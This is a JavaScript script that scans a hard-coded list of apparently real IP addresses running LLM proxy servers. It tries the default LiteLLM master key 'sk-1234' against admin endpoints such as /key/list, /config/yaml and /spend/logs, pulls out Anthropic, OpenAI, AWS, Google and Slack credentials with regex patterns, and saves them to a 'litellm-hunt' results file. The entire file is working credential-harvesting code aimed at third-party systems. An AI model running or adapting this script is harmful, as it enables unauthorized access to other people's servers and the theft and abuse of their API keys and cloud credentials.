const fs = require('fs');
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0 Safari/537.36';
const KEY = 'sk-1234';

const TARGETS = [
  { host: '34.204.120.143', port: 80, note: 'AWS Bedrock Claude' },
  { host: '52.54.130.116', port: 80, note: 'AWS Bedrock Claude' },
  { host: '51.84.218.27', port: 3000, note: 'IL 14 моделей' },
  { host: '119.45.115.224', port: 4000, note: 'CN Tencent gpt-5.5' },
  { host: '213.171.186.119', port: 4000, note: 'IT chat' },
  { host: '18.220.49.26', port: 80, note: 'US Ohio claude-list' },
  { host: '82.38.65.227', port: 4000, note: 'PL gemini/deepseek' },
  { host: '1.92.135.136', port: 4000, note: 'CN Beijing' },
];

const PATHS = [
  '/key/info',
  '/key/list',
  '/user/info',
  '/team/info',
  '/organization/info',
  '/config/yaml',
  '/v1/config/yaml',
  '/get/config',
  '/spend/logs',
  '/spend/report',
  '/global/spend/logs',
  '/budget/info',
  '/model/info?return_wildcard_routes=true',
  '/v1/key/info',
  '/v1/user/info',
  '/health/readiness',
];

const KEY_RE = /(sk-ant-[A-Za-z0-9_\-]{16,}|sk-proj-[A-Za-z0-9_\-]{16,}|sk-[A-Za-z0-9_\-]{24,}|AIza[0-9A-Za-z_\-]{30,}|AKIA[0-9A-Z]{16}|xox[baprs]-[A-Za-z0-9\-]{10,})/g;
const SECRET_RE = /(ANTHROPIC_API_KEY|OPENAI_API_KEY|OPENAI_API_BASE|GOOGLE_API_KEY|GEMINI_API_KEY|MASTER_KEY|LITELLM_MASTER_KEY|AZURE_OPENAI_API_KEY|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|VERTEX_PROJECT|VERTEX_LOCATION|CODEX_API_KEY)\s*[=:]\s*["']?([A-Za-z0-9_\-\.\/]{8,})/gi;

async function req(host, port, path, method, bodyObj) {
  const scheme = [443, 2443, 4433, 7443, 8443, 8444, 9443, 9840].includes(port) ? 'https' : 'http';
  const h = host.includes(':') ? `[${host}]` : host;
  const headers = { 'user-agent': UA, accept: '*/*', authorization: 'Bearer ' + KEY };
  if (bodyObj) headers['content-type'] = 'application/json';
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), 12000);
  try {
    const r = await fetch(`${scheme}://${h}:${port}${path}`, {
      method, headers, body: bodyObj ? JSON.stringify(bodyObj) : undefined, signal: c.signal,
    });
    const text = await r.text();
    const ct = r.headers.get('content-type') || '';
    return { status: r.status, ct, body: text.slice(0, 30000), len: text.length };
  } catch (e) {
    return { status: 0, ct: '', body: String(e.name || e), len: 0 };
  } finally {
    clearTimeout(t);
  }
}

function extractKeys(text, out) {
  let m;
  const rx = new RegExp(KEY_RE.source, 'g');
  while ((m = rx.exec(text))) out.add(m[1]);
  const rx2 = new RegExp(SECRET_RE.source, 'gi');
  while ((m = rx2.exec(text))) out.add(`${m[1]}=${m[2]}`);
  // api_key fields in JSON
  const rx3 = /"(?:api_key|decrypted_api_key|litellm_key|aws_secret_access_key|azure_api_key|vertex_credentials|google_application_credentials)"\s*:\s*"([^"]{8,})"/g;
  while ((m = rx3.exec(text))) out.add(m[1]);
}

async function checkTarget(t) {
  const rec = { host: t.host, port: t.port, note: t.note, endpoints: [], keys: new Set() };
  for (const p of PATHS) {
    let r = await req(t.host, t.port, p, 'GET');
    if ((r.status === 405 || r.status === 422) && !r.ct.includes('text/html')) {
      r = await req(t.host, t.port, p, 'POST', {});
    }
    if (r.status === 200 && r.ct.includes('json') && !r.body.trim().startsWith('{')) continue;
    if (r.status === 200 && r.ct.includes('html')) continue;
    extractKeys(r.body, rec.keys);
    const isJson = r.ct.includes('json');
    const snippet = isJson ? r.body.slice(0, 160) : '';
    rec.endpoints.push({ path: p, status: r.status, ct: r.ct.slice(0, 30), isJson, snippet, len: r.len });
  }
  rec.keys = [...rec.keys];
  return rec;
}

async function main() {
  const out = [];
  for (const t of TARGETS) {
    const rec = await checkTarget(t);
    out.push(rec);
    const good = rec.endpoints.filter(e => e.status === 200 && e.isJson);
    process.stderr.write(`${t.host}:${t.port} 200-json=[${good.map(e => e.path).join(',') || '-'}] keys=${rec.keys.length}\n`);
  }
  fs.writeFileSync('docs/litellm-hunt/keys-wave2.json', JSON.stringify(out, null, 2));
  console.log('saved docs/litellm-hunt/keys-wave2.json');
}

main().catch(e => { console.error(e); process.exit(1); });
